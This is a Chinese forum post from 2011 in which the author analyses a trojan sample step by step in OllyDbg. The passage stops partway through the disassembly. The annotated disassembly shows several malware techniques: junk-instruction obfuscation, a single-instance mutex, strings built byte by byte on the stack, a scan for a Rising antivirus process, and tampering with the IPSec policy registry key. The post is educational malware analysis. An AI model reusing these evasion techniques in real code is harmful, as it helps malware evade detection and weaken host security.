

# 菜鸟对一病毒的详细分析~~~（愚人节快乐）

> 原文：[`www.pediy.com/kssd/pediy12/131721.html`](https://www.pediy.com/kssd/pediy12/131721.html)

文章标题：对一款木马的详细分析  
作者：曹无咎  
工具：OD，PEid  
时间：2011.4.1  
样本：见附件  
说明：菜鸟对一款木马的分析，失误之处还请大家指出  
  
  
这是在 52pojie 样本区下载的病毒样本，之前也分析过一个启发小马，趁现在还有空闲时间，抓紧分析分析。  
（宿舍的兄弟都在准备考研，我一个人在宿舍很是寂寞，嘿嘿~~）  
  
第一步：先用 PEid 查壳，发现是款压缩壳：WinUpack 0.32-0.39 final by Dwing，这个壳脱壳很简单，单步即可脱之，  
  
我们来到 oep：  
  
0041EAE0  /.  55            push    ebp                            
0041EAE1  |.  8BEC          mov     ebp, esp  
0041EAE3  |.  81EC 18040000 sub     esp, 418  
  
到达 OEP 后，我们就可以单步 F8 分析这个病毒到底做了哪些事情。  
  
第二步：  
  
OD 载入，  
  
0041EAE0  /.  55            push    ebp  
0041EAE1  |.  8BEC          mov     ebp, esp  
0041EAE3  |.  81EC 18040000 sub     esp, 418  
0041EAE9  |.  53            push    ebx  
0041EAEA  |.  56            push    esi  
0041EAEB  |.  57            push    edi  
0041EAEC  |.  60            pushad  
0041EAED  |.  83C0 12       add     eax, 12  
0041EAF0  |.  83C3 13       add     ebx, 13  
0041EAF3  |.  83C1 14       add     ecx, 14  
0041EAF6  |.  61            popad  
0041EAF7  |.  90            nop  
0041EAF8  |.  90            nop  
0041EAF9  |.  03DA          add     ebx, edx  
0041EAFB  |.  90            nop  
0041EAFC  |.  90            nop  
0041EAFD  |.  03DA          add     ebx, edx  
0041EAFF  |.  90            nop  
0041EB00  |.  F7D2          not     edx  
0041EB02  |.  90            nop  
0041EB03  |.  90            nop  
0041EB04  |.  90            nop  
0041EB05  |.  42            inc     edx  
0041EB06  |.  90            nop  
0041EB07  |.  90            nop  
0041EB08  |.  03DA          add     ebx, edx  
0041EB0A  |.  90            nop  
0041EB0B  |.  90            nop  
0041EB0C  |.  F7DA          neg     edx  
0041EB0E  |.  90            nop  
0041EB0F  |.  90            nop  
0041EB10  |.  60            pushad  
0041EB11  |.  33C0          xor     eax, eax  
0041EB13  |>  90            /nop  
0041EB14  |.  83EC 0C       |sub     esp, 0C  
0041EB17  |.  83C0 0C       |add     eax, 0C  
0041EB1A  |.  36:833C24 00  |cmp     dword ptr \[esp\], 0  
0041EB1F  |.^ 74 F2         \\je      short 0041EB13  
0041EB21  |.  03E0          add     esp, eax  
0041EB23  |.  61            popad  
0041EB24  |.  90            nop  
0041EB25  |.  90            nop  
0041EB26  |.  03DA          add     ebx, edx  
0041EB28  |.  90            nop  
0041EB29  |.  90            nop  
0041EB2A  |.  03DA          add     ebx, edx  
0041EB2C  |.  90            nop  
0041EB2D  |.  F7D2          not     edx  
0041EB2F  |.  90            nop  
0041EB30  |.  90            nop  
0041EB31  |.  90            nop  
0041EB32  |.  42            inc     edx  
0041EB33  |.  90            nop  
0041EB34  |.  90            nop  
0041EB35  |.  03DA          add     ebx, edx  
0041EB37  |.  90            nop  
0041EB38  |.  90            nop  
0041EB39  |.  F7DA          neg     edx  
0041EB3B  |.  90            nop  
0041EB3C  |.  90            nop  
0041EB3D  |.  60            pushad  
0041EB3E  |.  81E9 99000000 sub     ecx, 99  
0041EB44  |.  90            nop  
0041EB45  |.  35 99000000   xor     eax, 99  
0041EB4A  |.  90            nop  
0041EB4B  |.  2D 99000000   sub     eax, 99  
0041EB50  |.  61            popad  
0041EB51  |.  90            nop  
0041EB52  |.  90            nop  
0041EB53  |.  03D3          add     edx, ebx  
0041EB55  |.  90            nop  
0041EB56  |.  90            nop  
0041EB57  |.  03D3          add     edx, ebx  
0041EB59  |.  90            nop  
0041EB5A  |.  F7D3          not     ebx  
0041EB5C  |.  90            nop  
0041EB5D  |.  90            nop  
0041EB5E  |.  90            nop  
0041EB5F  |.  43            inc     ebx  
0041EB60  |.  90            nop  
0041EB61  |.  90            nop  
0041EB62  |.  03D3          add     edx, ebx  
0041EB64  |.  90            nop  
0041EB65  |.  90            nop  
0041EB66  |.  F7DB          neg     ebx  
0041EB68  |.  90            nop  
0041EB69  |.  90            nop  
  
这段代码是在进行重定位，确定 kernel.dll 的地址，这个编码有点奇怪~~~  
  
  
  
继续向下分析，主程序会创建一个互斥量“mlgbcao”（名字有点不和谐），用来防止重复启动：  
  
0041EB6A  |.  68 D4CE4100   push    0041CED4                         ;  ASCII "MLGBCAO."  
0041EB6F  |.  6A 00         push    0  
0041EB71  |.  6A 00         push    0  
0041EB73  |.  FF15 5C104000 call    dword ptr \[40105C\]               kernel.CreateMutexA  
0041EB79  |.  FF15 18104000 call    dword ptr \[401018\]               获取最近一次一异常  
0041EB7F  |.  3D B7000000   cmp     eax, 0B7                         eax 与 0B7h 作比较  
0041EB84  |.  75 08         jnz     short 0041EB8E                   不等则跳，这里跳走了，我们改标志位不让他跳  
0041EB86  |.  6A 00         push    0  
0041EB88  |.  FF15 58104000 call    dword ptr \[401058\]               exitprocess，退出函数，一定要跳走  
  
  
接下来，程序会继续定位函数地址，获取现在正在活动的窗口的窗口句柄并显示窗口  
  
  
  
0041EB8E    90              nop  
0041EB8F    90              nop  
0041EB90    03C8            add ecx,eax  
0041EB92    90              nop  
0041EB93    90              nop  
0041EB94    03C8            add ecx,eax  
0041EB96    90              nop  
0041EB97    F7D0            not eax  
0041EB99    90              nop  
0041EB9A    90              nop  
0041EB9B    90              nop  
0041EB9C    40              inc eax  
0041EB9D    90              nop  
0041EB9E    90              nop  
0041EB9F    03C8            add ecx,eax  
0041EBA1    90              nop  
0041EBA2    90              nop  
0041EBA3    F7D8            neg eax  
0041EBA5    90              nop  
0041EBA6    90              nop  
0041EBA7    B9 3F000000     mov ecx,3F  
0041EBAC    33C0            xor eax,eax  
0041EBAE    8DBD E8FBFFFF   lea edi,dword ptr ss:\[ebp-418\]  
0041EBB4    F3:AB           rep stos dword ptr es:\[edi\]  
0041EBB6    66:AB           stos word ptr es:\[edi\]  
0041EBB8    AA              stos byte ptr es:\[edi\]  
0041EBB9    FF15 C4104000   call dword ptr ds:\[<&USER32.GetActiveWindow>\]    ; user32.GetActiveWindow  
0041EBBF    90              nop  
0041EBC0    90              nop  
0041EBC1    03C8            add ecx,eax  
0041EBC3    90              nop  
0041EBC4    90              nop  
0041EBC5    03C8            add ecx,eax  
0041EBC7    90              nop  
0041EBC8    F7D0            not eax  
0041EBCA    90              nop  
0041EBCB    90              nop  
0041EBCC    90              nop  
0041EBCD    40              inc eax  
0041EBCE    90              nop  
0041EBCF    90              nop  
0041EBD0    03C8            add ecx,eax  
0041EBD2    90              nop  
0041EBD3    90              nop  
0041EBD4    F7D8            neg eax  
0041EBD6    90              nop  
0041EBD7    90              nop  
0041EBD8    60              pushad  
0041EBD9    81E9 99000000   sub ecx,99  
0041EBDF    90              nop  
0041EBE0    35 99000000     xor eax,99  
0041EBE5    90              nop  
0041EBE6    2D 99000000     sub eax,99  
0041EBEB    61              popad  
0041EBEC    90              nop  
0041EBED    90              nop  
0041EBEE    03D3            add edx,ebx  
0041EBF0    90              nop  
0041EBF1    90              nop  
0041EBF2    03D3            add edx,ebx  
0041EBF4    90              nop  
0041EBF5    F7D3            not ebx  
0041EBF7    90              nop  
0041EBF8    90              nop  
0041EBF9    90              nop  
0041EBFA    43              inc ebx  
0041EBFB    90              nop  
0041EBFC    90              nop  
0041EBFD    03D3            add edx,ebx  
0041EBFF    90              nop  
0041EC00    90              nop  
0041EC01    F7DB            neg ebx  
0041EC03    90              nop  
0041EC04    90              nop  
0041EC05    FF15 C4104000   call dword ptr ds:\[<&USER32.GetActiveWindow>\]    ; user32.GetActiveWindow  
0041EC0B    6A 05           push 5  
0041EC0D    50              push eax  
0041EC0E    FF15 B8104000   call dword ptr ds:\[<&USER32.ShowWindow>\]         ; user32.ShowWindow  
  
ShowWindow：  
0012FB94   00000000  |hWnd = NULL  
0012FB98   00000005  \\ShowState = SW\_SHOW  
  
  
继续单步向下走：  
  
0041EC14    60              pushad  
0041EC15    81E9 99000000   sub ecx,99  
0041EC1B    90              nop  
0041EC1C    35 99000000     xor eax,99  
0041EC21    90              nop  
0041EC22    2D 99000000     sub eax,99  
0041EC27    61              popad  
0041EC28    68 F09AB86F     push 6FB89AF0  
0041EC2D    6A 01           push 1  
0041EC2F    E8 AC030000     call x1un\_.0041EFE0    这个函数是做什么的呢？我们进去看看，  
定位程序进入点（可移植性定位），无什么实际意义，代码我就不贴了  
0041EC34    6A 00           push 0                          pThreadId = NULL   
0041EC36    6A 00           push 0                          CreationFlags = 0  
0041EC38    6A 00           push 0                          pThreadParm = NULL   
0041EC3A    68 10EA4100     push x1un\_.0041EA10             0012FB8C   0041EA10  |ThreadFunction = x1un\_.0041EA10       
0041EC3F    6A 00           push 0                          StackSize = 0  
0041EC41    6A 00           push 0                          0012FB84   00000000  |pSecurity = NULL  
0041EC43    FFD0            call eax                 CreateThread，创建线程  
0041EC45    68 94110000     push 1194  
0041EC4A    E8 F1F1FFFF     call x1un\_.0041DE40             加载 kernel32.dll 进去看看  
  
{  
0041DE40    83EC 18         sub esp,18  
0041DE43    B0 65           mov al,65  
0041DE45    56              push esi  
0041DE46    884424 06       mov byte ptr ss:\[esp+6\],al                     这里是进行字符之间的转换  
0041DE4A    884424 07       mov byte ptr ss:\[esp+7\],al  
0041DE4E    884424 0D       mov byte ptr ss:\[esp+D\],al  
0041DE52    884424 10       mov byte ptr ss:\[esp+10\],al  
0041DE56    8D4424 0C       lea eax,dword ptr ss:\[esp+C\]  
0041DE5A    B1 6C           mov cl,6C  
0041DE5C    50              push eax  
0041DE5D    C64424 08 53    mov byte ptr ss:\[esp+8\],53  
0041DE62    884C24 09       mov byte ptr ss:\[esp+9\],cl  
0041DE66    C64424 0C 70    mov byte ptr ss:\[esp+C\],70  
0041DE6B    C64424 0D 00    mov byte ptr ss:\[esp+D\],0  
0041DE70    C64424 10 4B    mov byte ptr ss:\[esp+10\],4B  
0041DE75    C64424 12 72    mov byte ptr ss:\[esp+12\],72  
0041DE7A    C64424 13 6E    mov byte ptr ss:\[esp+13\],6E  
0041DE7F    884C24 15       mov byte ptr ss:\[esp+15\],cl  
0041DE83    C64424 16 33    mov byte ptr ss:\[esp+16\],33  
0041DE88    C64424 17 32    mov byte ptr ss:\[esp+17\],32  
0041DE8D    C64424 18 2E    mov byte ptr ss:\[esp+18\],2E  
0041DE92    C64424 19 64    mov byte ptr ss:\[esp+19\],64  
0041DE97    884C24 1A       mov byte ptr ss:\[esp+1A\],cl  
0041DE9B    884C24 1B       mov byte ptr ss:\[esp+1B\],cl  
0041DE9F    C64424 1C 00    mov byte ptr ss:\[esp+1C\],0  
0041DEA4    FF15 24104000   call dword ptr ds:\[<&KERNEL32.LoadLibraryA>\]     ; kernel32.LoadLibraryA  
0041DEAA    8D4C24 04       lea ecx,dword ptr ss:\[esp+4\]                     ; sleep  
0041DEAE    8BF0            mov esi,eax                                      ; kernel32 的基址 7C800000  
0041DEB0    51              push ecx  
0041DEB1    56              push esi                                         ; 7c800000  
0041DEB2    FF15 20104000   call dword ptr ds:\[<&KERNEL32.GetProcAddress>\]   ; kernel32.GetProcAddress  
0041DEB8    85C0            test eax,eax  
0041DEBA    74 15           je short x1un\_.0041DED1  
0041DEBC    8B5424 20       mov edx,dword ptr ss:\[esp+20\]  
0041DEC0    52              push edx  
0041DEC1    FFD0            call eax  
0041DEC3    56              push esi                                         ; 基址 7c800000  
0041DEC4    FF15 30104000   call dword ptr ds:\[<&KERNEL32.FreeLibrary>\]      ; kernel32.FreeLibrary  
0041DECA    33C0            xor eax,eax  
0041DECC    5E              pop esi  
0041DECD    83C4 18         add esp,18  
0041DED0    C3              retn  
  
}  
  
上面的代码，创建了一个线程，加载了 kernel32.dll，准备干坏事了  
  
0041EC4F    90              nop                                               函数基址定位  
0041EC50    90              nop  
0041EC51    03C8            add ecx,eax  
0041EC53    90              nop  
0041EC54    90              nop  
0041EC55    03C8            add ecx,eax  
0041EC57    90              nop  
0041EC58    F7D0            not eax  
0041EC5A    90              nop  
0041EC5B    90              nop  
0041EC5C    90              nop  
0041EC5D    40              inc eax  
0041EC5E    90              nop  
0041EC5F    90              nop  
0041EC60    03C8            add ecx,eax  
0041EC62    90              nop  
0041EC63    90              nop  
0041EC64    F7D8            neg eax  
0041EC66    90              nop  
0041EC67    90              nop  
0041EC68    E8 03F8FFFF     call x1un\_.0041E470                              ; 关键，call 进去  
  
{  
0041E470    55              push ebp                                         很明显，建立一个栈  
0041E471    8BEC            mov ebp,esp  
0041E473    81EC 90050000   sub esp,590                                      大小 590h  
0041E479    B0 64           mov al,64                                        d  
0041E47B    B2 38           mov dl,38                                        8   
0041E47D    53              push ebx                                         7923AA28  
0041E47E    8845 E2         mov byte ptr ss:\[ebp-1E\],al                      d  
0041E481    8855 E4         mov byte ptr ss:\[ebp-1C\],dl                      8  
0041E484    8845 EE         mov byte ptr ss:\[ebp-12\],al                      d  
0041E487    8855 F0         mov byte ptr ss:\[ebp-10\],dl                      8  
0041E48A    8845 D6         mov byte ptr ss:\[ebp-2A\],al                      d  
0041E48D    8855 D8         mov byte ptr ss:\[ebp-28\],dl                      8  
0041E490    8845 DA         mov byte ptr ss:\[ebp-26\],al                      d  
0041E493    B1 61           mov cl,61  
0041E495    33DB            xor ebx,ebx  
0041E497    B0 74           mov al,74  
0041E499    B2 6F           mov dl,6F  
0041E49B    56              push esi  
0041E49C    57              push edi  
0041E49D    884D E0         mov byte ptr ss:\[ebp-20\],cl                       这里对栈分配数据，估计生成文件时会用到  
0041E4A0    C645 E1 6D      mov byte ptr ss:\[ebp-1F\],6D  
0041E4A4    C645 E3 6B      mov byte ptr ss:\[ebp-1D\],6B  
0041E4A8    C645 E5 2E      mov byte ptr ss:\[ebp-1B\],2E  
0041E4AC    C645 E6 73      mov byte ptr ss:\[ebp-1A\],73  
0041E4B0    C645 E7 79      mov byte ptr ss:\[ebp-19\],79  
0041E4B4    C645 E8 73      mov byte ptr ss:\[ebp-18\],73  
0041E4B8    885D E9         mov byte ptr ss:\[ebp-17\],bl  
0041E4BB    884D EC         mov byte ptr ss:\[ebp-14\],cl  
0041E4BE    C645 ED 6D      mov byte ptr ss:\[ebp-13\],6D  
0041E4C2    C645 EF 6B      mov byte ptr ss:\[ebp-11\],6B  
0041E4C6    C645 F1 2E      mov byte ptr ss:\[ebp-F\],2E  
0041E4CA    C645 F2 69      mov byte ptr ss:\[ebp-E\],69  
0041E4CE    C645 F3 6E      mov byte ptr ss:\[ebp-D\],6E  
0041E4D2    C645 F4 66      mov byte ptr ss:\[ebp-C\],66  
0041E4D6    885D F5         mov byte ptr ss:\[ebp-B\],bl  
0041E4D9    884D D4         mov byte ptr ss:\[ebp-2C\],cl  
0041E4DC    C645 D5 6D      mov byte ptr ss:\[ebp-2B\],6D  
0041E4E0    C645 D7 6B      mov byte ptr ss:\[ebp-29\],6B  
0041E4E4    C645 D9 2E      mov byte ptr ss:\[ebp-27\],2E  
0041E4E8    C645 DB 6C      mov byte ptr ss:\[ebp-25\],6C  
0041E4EC    C645 DC 6C      mov byte ptr ss:\[ebp-24\],6C  
0041E4F0    885D DD         mov byte ptr ss:\[ebp-23\],bl  
0041E4F3    8845 F8         mov byte ptr ss:\[ebp-8\],al  
0041E4F6    C645 F9 65      mov byte ptr ss:\[ebp-7\],65  
0041E4FA    C645 FA 73      mov byte ptr ss:\[ebp-6\],73  
0041E4FE    8845 FB         mov byte ptr ss:\[ebp-5\],al  
0041E501    884D FC         mov byte ptr ss:\[ebp-4\],cl  
0041E504    C645 FD 6C      mov byte ptr ss:\[ebp-3\],6C  
0041E508    C645 FE 6C      mov byte ptr ss:\[ebp-2\],6C  
0041E50C    885D FF         mov byte ptr ss:\[ebp-1\],bl  
0041E50F    C685 70FFFFFF 6>mov byte ptr ss:\[ebp-90\],63  
0041E516    8895 71FFFFFF   mov byte ptr ss:\[ebp-8F\],dl  
0041E51C    C685 72FFFFFF 6>mov byte ptr ss:\[ebp-8E\],6E  
0041E523    C685 73FFFFFF 6>mov byte ptr ss:\[ebp-8D\],66  
0041E52A    C685 74FFFFFF 6>mov byte ptr ss:\[ebp-8C\],69  
0041E531    C685 75FFFFFF 6>mov byte ptr ss:\[ebp-8B\],67  
0041E538    C685 76FFFFFF 2>mov byte ptr ss:\[ebp-8A\],20  
0041E53F    C685 77FFFFFF 5>mov byte ptr ss:\[ebp-89\],50  
0041E546    8895 78FFFFFF   mov byte ptr ss:\[ebp-88\],dl  
0041E54C    C685 79FFFFFF 6>mov byte ptr ss:\[ebp-87\],6C  
0041E553    C685 7AFFFFFF 6>mov byte ptr ss:\[ebp-86\],69  
0041E55A    C685 7BFFFFFF 6>mov byte ptr ss:\[ebp-85\],63  
0041E561    C685 7CFFFFFF 7>mov byte ptr ss:\[ebp-84\],79  
0041E568    C685 7DFFFFFF 4>mov byte ptr ss:\[ebp-83\],41  
0041E56F    C685 7EFFFFFF 6>mov byte ptr ss:\[ebp-82\],67  
0041E576    C685 7FFFFFFF 6>mov byte ptr ss:\[ebp-81\],65  
0041E57D    C645 80 6E      mov byte ptr ss:\[ebp-80\],6E  
0041E581    8845 81         mov byte ptr ss:\[ebp-7F\],al  
0041E584    C645 82 20      mov byte ptr ss:\[ebp-7E\],20  
0041E588    C645 83 73      mov byte ptr ss:\[ebp-7D\],73  
0041E58C    8845 84         mov byte ptr ss:\[ebp-7C\],al  
0041E58F    884D 85         mov byte ptr ss:\[ebp-7B\],cl  
0041E592    C645 86 72      mov byte ptr ss:\[ebp-7A\],72  
0041E596    8845 87         mov byte ptr ss:\[ebp-79\],al  
0041E599    C645 88 3D      mov byte ptr ss:\[ebp-78\],3D  
0041E59D    C645 89 20      mov byte ptr ss:\[ebp-77\],20  
0041E5A1    884D 8A         mov byte ptr ss:\[ebp-76\],cl  
0041E5A4    C645 8B 75      mov byte ptr ss:\[ebp-75\],75  
0041E5A8    8845 8C         mov byte ptr ss:\[ebp-74\],al  
0041E5AB    8855 8D         mov byte ptr ss:\[ebp-73\],dl  
0041E5AE    885D 8E         mov byte ptr ss:\[ebp-72\],bl  
0041E5B1    C645 A4 73      mov byte ptr ss:\[ebp-5C\],73  
0041E5B5    8845 A5         mov byte ptr ss:\[ebp-5B\],al  
0041E5B8    8855 A6         mov byte ptr ss:\[ebp-5A\],dl  
0041E5BB    8845 B3         mov byte ptr ss:\[ebp-4D\],al  
0041E5BE    8845 91         mov byte ptr ss:\[ebp-6F\],al  
0041E5C1    884D 92         mov byte ptr ss:\[ebp-6E\],cl  
0041E5C4    8845 94         mov byte ptr ss:\[ebp-6C\],al  
0041E5C7    8845 A0         mov byte ptr ss:\[ebp-60\],al  
0041E5CA    884D BD         mov byte ptr ss:\[ebp-43\],cl  
0041E5CD    884D C9         mov byte ptr ss:\[ebp-37\],cl  
0041E5D0    B9 3F000000     mov ecx,3F  
0041E5D5    33C0            xor eax,eax  
0041E5D7    8DBD 70FAFFFF   lea edi,dword ptr ss:\[ebp-590\]  
0041E5DD    F3:AB           rep stos dword ptr es:\[edi\]  
0041E5DF    66:AB           stos word ptr es:\[edi\]  
0041E5E1    C645 A7 70      mov byte ptr ss:\[ebp-59\],70  
0041E5E5    C645 A8 20      mov byte ptr ss:\[ebp-58\],20  
0041E5E9    C645 A9 50      mov byte ptr ss:\[ebp-57\],50  
0041E5ED    8855 AA         mov byte ptr ss:\[ebp-56\],dl  
0041E5F0    C645 AB 6C      mov byte ptr ss:\[ebp-55\],6C  
0041E5F4    C645 AC 69      mov byte ptr ss:\[ebp-54\],69  
0041E5F8    C645 AD 63      mov byte ptr ss:\[ebp-53\],63  
0041E5FC    C645 AE 79      mov byte ptr ss:\[ebp-52\],79  
0041E600    C645 AF 41      mov byte ptr ss:\[ebp-51\],41  
0041E604    C645 B0 67      mov byte ptr ss:\[ebp-50\],67  
0041E608    C645 B1 65      mov byte ptr ss:\[ebp-4F\],65  
0041E60C    C645 B2 6E      mov byte ptr ss:\[ebp-4E\],6E  
0041E610    885D B4         mov byte ptr ss:\[ebp-4C\],bl  
0041E613    C645 90 73      mov byte ptr ss:\[ebp-70\],73  
0041E617    C645 93 72      mov byte ptr ss:\[ebp-6D\],72  
0041E61B    C645 95 20      mov byte ptr ss:\[ebp-6B\],20  
0041E61F    C645 96 50      mov byte ptr ss:\[ebp-6A\],50  
0041E623    8855 97         mov byte ptr ss:\[ebp-69\],dl  
0041E626    C645 98 6C      mov byte ptr ss:\[ebp-68\],6C  
0041E62A    C645 99 69      mov byte ptr ss:\[ebp-67\],69  
0041E62E    C645 9A 63      mov byte ptr ss:\[ebp-66\],63  
0041E632    C645 9B 79      mov byte ptr ss:\[ebp-65\],79  
0041E636    C645 9C 41      mov byte ptr ss:\[ebp-64\],41  
0041E63A    C645 9D 67      mov byte ptr ss:\[ebp-63\],67  
0041E63E    C645 9E 65      mov byte ptr ss:\[ebp-62\],65  
0041E642    C645 9F 6E      mov byte ptr ss:\[ebp-61\],6E  
0041E646    885D A1         mov byte ptr ss:\[ebp-5F\],bl  
0041E649    C645 B8 70      mov byte ptr ss:\[ebp-48\],70  
0041E64D    C645 B9 72      mov byte ptr ss:\[ebp-47\],72  
0041E651    8855 BA         mov byte ptr ss:\[ebp-46\],dl  
0041E654    C645 BB 67      mov byte ptr ss:\[ebp-45\],67  
0041E658    C645 BC 72      mov byte ptr ss:\[ebp-44\],72  
0041E65C    C645 BE 7E      mov byte ptr ss:\[ebp-42\],7E  
0041E660    C645 BF 31      mov byte ptr ss:\[ebp-41\],31  
0041E664    C645 C0 5C      mov byte ptr ss:\[ebp-40\],5C  
0041E668    C645 C1 41      mov byte ptr ss:\[ebp-3F\],41  
0041E66C    C645 C2 54      mov byte ptr ss:\[ebp-3E\],54  
0041E670    C645 C3 49      mov byte ptr ss:\[ebp-3D\],49  
0041E674    885D C4         mov byte ptr ss:\[ebp-3C\],bl  
0041E677    C645 C8 52      mov byte ptr ss:\[ebp-38\],52  
0041E67B    C645 CA 76      mov byte ptr ss:\[ebp-36\],76  
0041E67F    C645 CB 4D      mov byte ptr ss:\[ebp-35\],4D  
0041E683    8855 CC         mov byte ptr ss:\[ebp-34\],dl  
0041E686    C645 CD 6E      mov byte ptr ss:\[ebp-33\],6E  
0041E68A    C645 CE 44      mov byte ptr ss:\[ebp-32\],44  
0041E68E    C645 CF 2E      mov byte ptr ss:\[ebp-31\],2E  
0041E692    C645 D0 65      mov byte ptr ss:\[ebp-30\],65  
0041E696    C645 D1 78      mov byte ptr ss:\[ebp-2F\],78  
0041E69A    C645 D2 65      mov byte ptr ss:\[ebp-2E\],65  
0041E69E    885D D3         mov byte ptr ss:\[ebp-2D\],bl  
0041E6A1    AA              stos byte ptr es:\[edi\]  
0041E6A2    90              nop  
0041E6A3    90              nop  
0041E6A4    03DA            add ebx,edx  
0041E6A6    90              nop  
0041E6A7    90              nop  
0041E6A8    03DA            add ebx,edx  
0041E6AA    90              nop  
0041E6AB    F7D2            not edx  
0041E6AD    90              nop  
0041E6AE    90              nop  
0041E6AF    90              nop  
0041E6B0    42              inc edx  
0041E6B1    90              nop  
0041E6B2    90              nop  
0041E6B3    03DA            add ebx,edx  
0041E6B5    90              nop  
0041E6B6    90              nop  
0041E6B7    F7DA            neg edx  
0041E6B9    90              nop  
0041E6BA    90              nop  
0041E6BB    8D45 C8         lea eax,dword ptr ss:\[ebp-38\]             RavMondD.exe 明显瑞星主程序  
0041E6BE    50              push eax  
0041E6BF    E8 BCF8FFFF     call x1un\_.0041DF80                       创建进程快照，开始遍历进程，查找瑞星进程  
这里就是很基本的函数了：CreateToolhelp32Snapshot,Process32First,Process32Next,没有找到瑞星进程~~~~  
  
0041E6C4    83C4 04         add esp,4  
0041E6C7    85C0            test eax,eax  
0041E6C9    75 78           jnz short x1un\_.0041E743                  此处没有跳  
0041E6CB    E8 90FBFFFF     call x1un\_.0041E260                       这个函数关键（重启 IPSec 服务），跟进看看  
{  
0041E260    81EC 3C020000   sub esp,23C                              分配空间  
0041E266    B0 6F           mov al,6F                                下面就是初始化空间了，最后会打开注册表的 IPSec  
0041E268    53              push ebx  
0041E269    884424 0E       mov byte ptr ss:\[esp+E\],al  
0041E26D    B3 69           mov bl,69  
0041E26F    884424 1A       mov byte ptr ss:\[esp+1A\],al  
0041E273    884424 1C       mov byte ptr ss:\[esp+1C\],al  
0041E277    884424 24       mov byte ptr ss:\[esp+24\],al  
0041E27B    884424 2F       mov byte ptr ss:\[esp+2F\],al  
0041E27F    884424 36       mov byte ptr ss:\[esp+36\],al  
0041E283    B1 5C           mov cl,5C  
0041E285    8D4424 3C       lea eax,dword ptr ss:\[esp+3C\]  
0041E289    885C24 10       mov byte ptr ss:\[esp+10\],bl  
0041E28D    885C24 12       mov byte ptr ss:\[esp+12\],bl  
0041E291    885C24 17       mov byte ptr ss:\[esp+17\],bl  
0041E295    885C24 21       mov byte ptr ss:\[esp+21\],bl  
0041E299    885C24 31       mov byte ptr ss:\[esp+31\],bl  
0041E29D    884C24 0C       mov byte ptr ss:\[esp+C\],cl  
0041E2A1    884C24 15       mov byte ptr ss:\[esp+15\],cl  
0041E2A5    884C24 1F       mov byte ptr ss:\[esp+1F\],cl  
0041E2A9    884C24 27       mov byte ptr ss:\[esp+27\],cl  
0041E2AD    884C24 2D       mov byte ptr ss:\[esp+2D\],cl  
0041E2B1    884C24 34       mov byte ptr ss:\[esp+34\],cl  
0041E2B5    33DB            xor ebx,ebx  
0041E2B7    50              push eax  
0041E2B8    68 3F000F00     push 0F003F  
0041E2BD    8D4C24 0C       lea ecx,dword ptr ss:\[esp+C\]  
0041E2C1    53              push ebx  
0041E2C2    B2 63           mov dl,63  
0041E2C4    51              push ecx  
0041E2C5    68 02000080     push 80000002  
0041E2CA    C64424 18 53    mov byte ptr ss:\[esp+18\],53  
0041E2CF    C64424 19 4F    mov byte ptr ss:\[esp+19\],4F  
0041E2D4    C64424 1A 46    mov byte ptr ss:\[esp+1A\],46  
0041E2D9    C64424 1B 54    mov byte ptr ss:\[esp+1B\],54  
0041E2DE    C64424 1C 57    mov byte ptr ss:\[esp+1C\],57  
0041E2E3    C64424 1D 41    mov byte ptr ss:\[esp+1D\],41  
0041E2E8    C64424 1E 52    mov byte ptr ss:\[esp+1E\],52  
0041E2ED    C64424 1F 45    mov byte ptr ss:\[esp+1F\],45  
0041E2F2    C64424 21 50    mov byte ptr ss:\[esp+21\],50  
0041E2F7    C64424 23 6C    mov byte ptr ss:\[esp+23\],6C  
0041E2FC    885424 25       mov byte ptr ss:\[esp+25\],dl  
0041E300    C64424 27 65    mov byte ptr ss:\[esp+27\],65  
0041E305    C64424 28 73    mov byte ptr ss:\[esp+28\],73  
0041E30A    C64424 2A 4D    mov byte ptr ss:\[esp+2A\],4D  
0041E30F    885424 2C       mov byte ptr ss:\[esp+2C\],dl  
0041E313    C64424 2D 72    mov byte ptr ss:\[esp+2D\],72  
0041E318    C64424 2F 73    mov byte ptr ss:\[esp+2F\],73  
0041E31D    C64424 31 66    mov byte ptr ss:\[esp+31\],66  
0041E322    C64424 32 74    mov byte ptr ss:\[esp+32\],74  
0041E327    C64424 34 57    mov byte ptr ss:\[esp+34\],57  
0041E32C    C64424 36 6E    mov byte ptr ss:\[esp+36\],6E  
0041E331    C64424 37 64    mov byte ptr ss:\[esp+37\],64  
0041E336    C64424 39 77    mov byte ptr ss:\[esp+39\],77  
0041E33B    C64424 3A 73    mov byte ptr ss:\[esp+3A\],73  
0041E340    C64424 3C 49    mov byte ptr ss:\[esp+3C\],49  
0041E345    C64424 3D 50    mov byte ptr ss:\[esp+3D\],50  
0041E34A    C64424 3E 53    mov byte ptr ss:\[esp+3E\],53  
0041E34F    C64424 3F 65    mov byte ptr ss:\[esp+3F\],65  
0041E354    885424 40       mov byte ptr ss:\[esp+40\],dl  
0041E358    C64424 42 50    mov byte ptr ss:\[esp+42\],50  
0041E35D    C64424 44 6C    mov byte ptr ss:\[esp+44\],6C  
0041E362    885424 46       mov byte ptr ss:\[esp+46\],dl  
0041E366    C64424 47 79    mov byte ptr ss:\[esp+47\],79  
0041E36B    C64424 49 4C    mov byte ptr ss:\[esp+49\],4C  
0041E370    885424 4B       mov byte ptr ss:\[esp+4B\],dl  
0041E374    C64424 4C 61    mov byte ptr ss:\[esp+4C\],61  
0041E379    C64424 4D 6C    mov byte ptr ss:\[esp+4D\],6C  
0041E37E    885C24 4E       mov byte ptr ss:\[esp+4E\],bl  
  
上面的代码形成了注册表路径：SOFTWARE\\Policies\\Microsoft\\Windows\\IPSec\\Policy\\Local  
  
0041E382    E8 59FDFFFF     call x1un\_.0041E0E0  
  
这个函数前面已经出现过了，就是加载 DLL，这次加载的是 advapi32，基址是：77DA0000，开始对注册表进行操作  
  
{  
0041E0E0    83EC 20         sub esp,20  
0041E0E3    B0 65           mov al,65  
0041E0E5    56              push esi  
0041E0E6    884424 15       mov byte ptr ss:\[esp+15\],al  
0041E0EA    884424 19       mov byte ptr ss:\[esp+19\],al  
0041E0EE    884424 1C       mov byte ptr ss:\[esp+1C\],al  
0041E0F2    B0 64           mov al,64  
0041E0F4    884424 05       mov byte ptr ss:\[esp+5\],al  
0041E0F8    884424 0D       mov byte ptr ss:\[esp+D\],al  
0041E0FC    B0 6C           mov al,6C  
0041E0FE    B2 70           mov dl,70  
0041E100    884424 0E       mov byte ptr ss:\[esp+E\],al  
0041E104    884424 0F       mov byte ptr ss:\[esp+F\],al  
0041E108    8D4424 04       lea eax,dword ptr ss:\[esp+4\]  
0041E10C    B1 61           mov cl,61  
0041E10E    50              push eax  
